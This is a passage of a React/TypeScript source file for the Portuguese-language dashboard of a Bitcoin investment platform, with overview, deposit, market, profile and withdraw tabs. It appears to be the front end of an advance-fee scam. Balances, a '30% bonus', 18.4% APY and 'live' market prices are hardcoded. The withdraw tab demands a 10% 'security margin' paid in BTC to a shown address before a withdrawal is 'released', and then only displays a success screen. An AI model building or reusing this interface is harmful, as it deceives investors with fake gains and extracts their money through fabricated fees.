        {tab === "withdraw" && <WithdrawTab balanceBTC={currentBalance} onDone={onWithdrawn} />}
        {tab === "market" && <MarketTab />}
        {tab === "profile" && <ProfileTab />}
      </section>

      {/* Mobile bottom nav */}
      <nav className="md:hidden fixed bottom-3 left-3 right-3 z-40 rounded-2xl glass px-2 py-2 flex items-center justify-around shadow-2xl">
        {TABS.slice(0, 5).map((t) => (
          <button
            key={t.id}
            onClick={() => setTab(t.id)}
            className={`flex flex-col items-center gap-0.5 px-2 py-1.5 rounded-xl text-[10px] font-semibold tracking-wide transition ${
              tab === t.id ? "text-lime" : "text-white/55"
            }`}
          >
            <span className={`${tab === t.id ? "bg-lime/15 rounded-lg p-1.5" : "p-1.5"}`}>{t.icon}</span>
            {t.label.toUpperCase()}
          </button>
        ))}
      </nav>
    </div>
  );
}

function SideItem({
  icon, children, active, onClick,
}: { icon: React.ReactNode; children: React.ReactNode; active?: boolean; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className={`w-full flex items-center gap-3 rounded-xl px-3 py-2.5 text-sm font-medium transition ${
        active ? "bg-lime/15 text-lime border border-lime/30" : "text-white/70 hover:bg-white/[0.04] border border-transparent"
      }`}
    >
      {icon}
      {children}
    </button>
  );
}

function Overview({
  balanceBTC, depositBTC, onWithdraw,
}: { balanceBTC: number; depositBTC: number; onWithdraw: () => void }) {
  const brl = balanceBTC * BTC_RATE_BRL;
  return (
    <>
      {/* Hero card — BTC is the headline, BRL is a small subtitle */}
      <div className="relative overflow-hidden rounded-[2rem] glass p-6">
        <div className="absolute -top-6 -right-6 opacity-40"><HexaCoin size={140} /></div>
        <div className="relative space-y-3">
          <div className="flex items-center gap-2 font-mono-tag text-white/50">
            <Wallet className="h-3 w-3" /> SALDO TOTAL
          </div>
          <div>
            <div className="text-4xl sm:text-5xl font-semibold tracking-[-0.05em] shimmer-text tabular-nums leading-none">
              {balanceBTC.toLocaleString("pt-BR", { minimumFractionDigits: 6, maximumFractionDigits: 8 })}
            </div>
            <div className="font-mono-tag text-lime mt-1.5">BTC</div>
            <div className="text-xs text-white/40 mt-2 tabular-nums">≈ {fmtBRL(brl)}</div>
          </div>
          <div className="flex flex-wrap gap-2 pt-1">
            <div className="inline-flex items-center gap-1.5 rounded-full bg-lime/15 border border-lime/30 px-3 py-1 text-xs font-semibold text-lime">
              <TrendingUp className="h-3 w-3" />
              Bônus de 30% aplicado
            </div>
            <div className="inline-flex items-center gap-1.5 rounded-full bg-white/[0.04] border border-white/10 px-3 py-1 text-xs font-semibold text-white/70">
              <Activity className="h-3 w-3 text-lime" /> Estratégia ativa
            </div>
          </div>
          <button
            onClick={onWithdraw}
            className="mt-3 w-full sm:w-auto inline-flex items-center justify-center gap-2 rounded-full bg-lime text-black font-bold px-6 py-3 text-sm hover:scale-[1.01] transition"
            style={{ boxShadow: "0 0 24px oklch(0.83 0.17 84 / 30%)" }}
          >
            Solicitar saque <ArrowRight className="h-4 w-4" />
          </button>
        </div>
      </div>

      {/* Yield chart card */}
      <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
        <div className="flex items-start justify-between gap-3">
          <div>
            <div className="font-mono-tag text-white/50">RENDIMENTO ACUMULADO</div>
            <div className="text-2xl sm:text-3xl font-semibold tracking-tight mt-1 tabular-nums">
              +{fmtBTC(depositBTC * 0.184)}
            </div>
            <div className="text-xs text-white/40 mt-0.5 tabular-nums">
              ≈ {fmtBRL(depositBTC * 0.184 * BTC_RATE_BRL)} · APY 18,4%
            </div>
          </div>
          <div className="font-mono-tag text-lime flex items-center gap-1.5 shrink-0">
            <span className="h-1.5 w-1.5 rounded-full bg-lime animate-pulse" /> AO VIVO
          </div>
        </div>
        <YieldChart height={150} />
        <div className="grid grid-cols-3 gap-2">
          <MiniStat label="Hoje" value="+0,051%" accent compact />
          <MiniStat label="7 dias" value="+0,38%" compact />
          <MiniStat label="30 dias" value="+1,62%" compact />
        </div>
      </div>

      {/* Position breakdown — BTC values lead, BRL subdued */}
      <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
        <div>
          <div className="font-mono-tag text-white/50">RESUMO DA POSIÇÃO</div>
          <h3 className="text-xl font-semibold tracking-tight mt-1">Sua estratégia</h3>
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
          <MiniStat label="Aporte" value={fmtBTC(depositBTC)} />
          <MiniStat label="Bônus creditado" value={`+${fmtBTC(depositBTC * 0.3)}`} accent />
          <MiniStat label="Estratégia" value="Delta-neutra" />
        </div>
      </div>
    </>
  );
}

function MiniStat({ label, value, accent, compact }: { label: string; value: string; accent?: boolean; compact?: boolean }) {
  return (
    <div className={`rounded-2xl bg-white/[0.03] border border-white/10 ${compact ? "p-3" : "p-4"}`}>
      <div className="font-mono-tag text-white/50">{label}</div>
      <div className={`mt-1 font-semibold tabular-nums ${compact ? "text-sm" : "text-lg"} ${accent ? "text-lime" : ""}`}>{value}</div>
    </div>
  );
}

function DepositTab() {
  const [phase, setPhase] = useState<"amount" | "address">("amount");
  const [value, setValue] = useState("0.01");
  const [loading, setLoading] = useState(false);
  const num = Number(value) || 0;

  if (phase === "amount") {
    return (
      <Deposit
        value={value}
        onChange={setValue}
        onNext={() => {
          setLoading(true);
          setTimeout(() => { setLoading(false); setPhase("address"); }, 700);
        }}
      />
    );
  }

  return (
    <div className="space-y-4">
      <button
        onClick={() => setPhase("amount")}
        className="font-mono-tag text-white/50 hover:text-lime transition"
      >
        ← ALTERAR VALOR
      </button>
      <Payment amountBTC={num} onNext={() => setPhase("amount")} />
    </div>
  );
}

/* ---------- MARKET ---------- */

const MARKET_ASSETS = [
  { sym: "BTC", name: "Bitcoin", price: 350_000, change: 2.34 },
  { sym: "ETH", name: "Ethereum", price: 18_420, change: 1.12 },
  { sym: "SOL", name: "Solana", price: 940, change: -0.85 },
  { sym: "BNB", name: "BNB", price: 3_120, change: 0.42 },
  { sym: "XRP", name: "XRP", price: 3.18, change: 3.91 },
  { sym: "ADA", name: "Cardano", price: 2.47, change: -1.20 },
  { sym: "AVAX", name: "Avalanche", price: 215, change: 0.66 },
  { sym: "DOGE", name: "Dogecoin", price: 0.92, change: -2.10 },
  { sym: "LINK", name: "Chainlink", price: 142, change: 1.78 },
  { sym: "MATIC", name: "Polygon", price: 4.85, change: -0.34 },
];

function MarketTab() {
  const [query, setQuery] = useState("");
  const filtered = MARKET_ASSETS.filter(a =>
    a.sym.toLowerCase().includes(query.toLowerCase()) ||
    a.name.toLowerCase().includes(query.toLowerCase())
  );
  return (
    <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
      <SectionTitle title="Mercado" subtitle="Cotações em tempo real das principais criptomoedas." />
      <input
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        placeholder="Buscar ativo…"
        className="w-full rounded-xl bg-white/[0.04] border border-white/10 px-4 py-3 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition placeholder:text-white/30"
      />
      <div className="divide-y divide-white/10">
        <div className="grid grid-cols-[1fr_auto_auto] gap-3 py-2 font-mono-tag text-white/40 text-[10px]">
          <span>ATIVO</span>
          <span className="text-right">PREÇO</span>
          <span className="text-right w-16">24H</span>
        </div>
        {filtered.map((a) => (
          <div key={a.sym} className="grid grid-cols-[1fr_auto_auto] gap-3 py-3 items-center">
            <div className="min-w-0">
              <div className="font-semibold text-sm">{a.sym}</div>
              <div className="font-mono-tag text-white/40">{a.name}</div>
            </div>
            <div className="text-right text-sm font-semibold tabular-nums">{fmtBRL(a.price)}</div>
            <div className={`text-right text-xs font-semibold tabular-nums w-16 ${a.change >= 0 ? "text-lime" : "text-warning"}`}>
              {a.change >= 0 ? "+" : ""}{a.change.toFixed(2)}%
            </div>
          </div>
        ))}
        {filtered.length === 0 && (
          <div className="py-6 text-center text-sm text-white/40">Nenhum ativo encontrado</div>
        )}
      </div>
    </div>
  );
}

/* ---------- PROFILE ---------- */

function ProfileTab() {
  const [name, setName] = useState("Cliente Hexa");
  const [email, setEmail] = useState("voce@email.com");
  const [phone, setPhone] = useState("");
  const [notifications, setNotifications] = useState(true);
  const [twoFA, setTwoFA] = useState(true);
  const [saved, setSaved] = useState(false);

  const save = () => {
    setSaved(true);
    setTimeout(() => setSaved(false), 1500);
  };

  return (
    <div className="space-y-4">
      <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
        <SectionTitle title="Perfil" subtitle="Personalize suas informações de conta e preferências." />

        <div className="flex items-center gap-4">
          <div className="h-16 w-16 rounded-full bg-lime/15 border border-lime/30 flex items-center justify-center text-lime text-xl font-bold">
            {name.charAt(0).toUpperCase()}
          </div>
          <div className="min-w-0">
            <div className="font-semibold truncate">{name || "Sem nome"}</div>
            <div className="font-mono-tag text-white/40 truncate">{email}</div>
          </div>
        </div>

        <Field label="NOME">
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            className="w-full rounded-xl bg-white/[0.04] border border-white/10 px-4 py-3 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition"
          />
        </Field>

        <Field label="E-MAIL">
          <input
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            type="email"
            className="w-full rounded-xl bg-white/[0.04] border border-white/10 px-4 py-3 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition"
          />
        </Field>

        <Field label="TELEFONE">
          <input
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="(11) 99999-0000"
            className="w-full rounded-xl bg-white/[0.04] border border-white/10 px-4 py-3 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition placeholder:text-white/30"
          />
        </Field>
      </div>

      <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-3">
        <div className="font-mono-tag text-white/50">PREFERÊNCIAS</div>
        <ToggleRow
          label="Notificações por e-mail"
          desc="Receba alertas sobre funding capturado e movimentações."
          value={notifications}
          onChange={setNotifications}
        />
        <ToggleRow
          label="Autenticação em dois fatores"
          desc="Camada extra de segurança no login."
          value={twoFA}
          onChange={setTwoFA}
        />
      </div>

      <PrimaryButton onClick={save}>
        {saved ? <><Check className="h-5 w-5" /> Salvo</> : <>Salvar alterações <ArrowRight className="h-5 w-5" /></>}
      </PrimaryButton>
    </div>
  );
}

function ToggleRow({
  label, desc, value, onChange,
}: { label: string; desc: string; value: boolean; onChange: (v: boolean) => void }) {
  return (
    <button
      onClick={() => onChange(!value)}
      className="w-full flex items-center justify-between gap-3 rounded-xl bg-white/[0.03] border border-white/10 p-3 text-left hover:border-lime/40 transition"
    >
      <div className="min-w-0">
        <div className="text-sm font-semibold">{label}</div>
        <div className="text-xs text-white/50">{desc}</div>
      </div>
      <span className={`h-6 w-11 rounded-full p-0.5 transition shrink-0 ${value ? "bg-lime" : "bg-white/15"}`}>
        <span className={`block h-5 w-5 rounded-full bg-black transition ${value ? "translate-x-5" : ""}`} />
      </span>
    </button>
  );
}

/* ---------- WITHDRAW with 10% margin ---------- */

type WithdrawPhase = "form" | "margin" | "done";

function WithdrawTab({ balanceBTC, onDone }: { balanceBTC: number; onDone: (amount: number) => void }) {
  const [phase, setPhase] = useState<WithdrawPhase>("form");
  const [val, setVal] = useState<string>((balanceBTC / 2).toFixed(6));
  const requested = Math.max(0, Number(val) || 0);
  const margin = +(requested * 0.1).toFixed(8);

  return (
    <div className="space-y-5">
      {phase === "form" && (
        <>
          <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
            <SectionTitle
              title="Solicitação de saque"
              subtitle="Após 24h da confirmação, o saque é processado para a sua carteira."
            />
            <Field label="VALOR DO SAQUE (BTC)">
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 font-mono-tag text-lime">BTC</span>
                <input
                  value={val}
                  onChange={(e) => setVal(e.target.value.replace(/[^0-9.]/g, ""))}
                  inputMode="decimal"
                  className="w-full rounded-xl bg-white/[0.04] border border-white/10 pl-16 pr-4 py-4 text-2xl font-semibold tabular-nums outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition"
                />
              </div>
            </Field>
            <div className="flex items-center justify-between text-xs">
              <button onClick={() => setVal(balanceBTC.toFixed(8))} className="font-semibold text-lime hover:underline">
                Sacar tudo · {fmtBTC(balanceBTC)}
              </button>
              <span className="text-white/40 tabular-nums">≈ {fmtBRL(requested * BTC_RATE_BRL)}</span>
            </div>
            <div className="rounded-xl bg-warning/10 border border-warning/30 p-3 text-xs text-white/80 flex items-start gap-2">
              <AlertTriangle className="h-4 w-4 text-warning shrink-0 mt-0.5" />
              <span>
                Saques exigem <b>margem de segurança de 10%</b> em BTC sobre o valor solicitado.
                Para esse saque: <b className="text-warning">{fmtBTC(margin)}</b>. Reembolsada
                junto ao saque.
              </span>
            </div>
          </div>

          <PrimaryButton
            onClick={() => setPhase("margin")}
            disabled={requested <= 0 || requested > balanceBTC}
          >
            Continuar para margem <ArrowRight className="h-5 w-5" />
          </PrimaryButton>
        </>
      )}

      {phase === "margin" && (
        <>
          <div className="rounded-[2rem] glass p-5 sm:p-6 space-y-4">
            <SectionTitle
              title="Margem de segurança"
              subtitle={`Envie ${fmtBTC(margin)} (10% do saque solicitado) para liberar o processamento.`}
            />
            <div className="rounded-xl bg-black/40 border border-white/10 p-4 space-y-1">
              <div className="font-mono-tag text-white/50">VALOR DA MARGEM</div>
              <div className="text-2xl font-semibold tabular-nums">{fmtBTC(margin)}</div>
              <div className="text-xs text-white/40">≈ {fmtBRL(margin * BTC_RATE_BRL)}</div>
            </div>
            <div>
              <div className="font-mono-tag text-white/50 mb-2">ENDEREÇO DA MARGEM (REDE BTC)</div>
              <div className="rounded-xl bg-black/50 border border-white/10 p-3 font-mono text-[12px] break-all text-white/85 select-all">
                bc1qmargin9x2c4a8saque5address7btc1secure3
              </div>
            </div>
          </div>

          <PrimaryButton onClick={() => { setPhase("done"); setTimeout(() => onDone(requested), 1400); }}>
            Confirmar pagamento da margem <ArrowRight className="h-5 w-5" />
          </PrimaryButton>
        </>
      )}

      {phase === "done" && (
        <div className="rounded-[2rem] glass p-8 text-center space-y-3">
          <div className="mx-auto h-16 w-16 rounded-full bg-lime/20 flex items-center justify-center animate-pulse-gold">
            <Check className="h-8 w-8 text-lime" />
          </div>
          <div className="text-xl font-semibold">Saque liberado</div>
          <div className="text-sm text-white/60">Processando o envio de {fmtBTC(requested)} para a sua carteira.</div>
        </div>
      )}
    </div>
  );
}

/* ---------- PRIMITIVES ---------- */

function Row({
  label, value, highlight, success, mono,
}: { label: string; value: string; highlight?: boolean; success?: boolean; mono?: boolean }) {
  return (
    <div className="flex items-center justify-between text-sm">
      <span className="text-white/60">{label}</span>
      <span className={`${highlight ? "font-bold text-lime text-base" : success ? "font-bold text-lime" : "font-semibold"} ${mono ? "font-mono text-xs" : "tabular-nums"}`}>
        {value}
      </span>
    </div>
  );
}

function SectionTitle({ title, subtitle }: { title: string; subtitle?: string }) {
  return (
    <div className="space-y-2.5">
      <h2 className="text-2xl font-semibold tracking-[-0.05em] leading-tight">{title}</h2>
      {subtitle && <p className="text-sm text-white/60 leading-relaxed">{subtitle}</p>}
    </div>
  );
}

function PrimaryButton({
  children, onClick, disabled,
}: { children: React.ReactNode; onClick: () => void; disabled?: boolean }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className="group relative w-full flex items-center justify-center gap-2 rounded-full bg-lime text-black font-bold tracking-tight py-4 text-sm transition-all duration-300 hover:scale-[1.02] active:scale-[0.99] disabled:opacity-30 disabled:cursor-not-allowed disabled:hover:scale-100"
      style={{ boxShadow: "0 0 30px oklch(0.83 0.17 84 / 35%)" }}
    >
      {children}
    </button>
  );
}
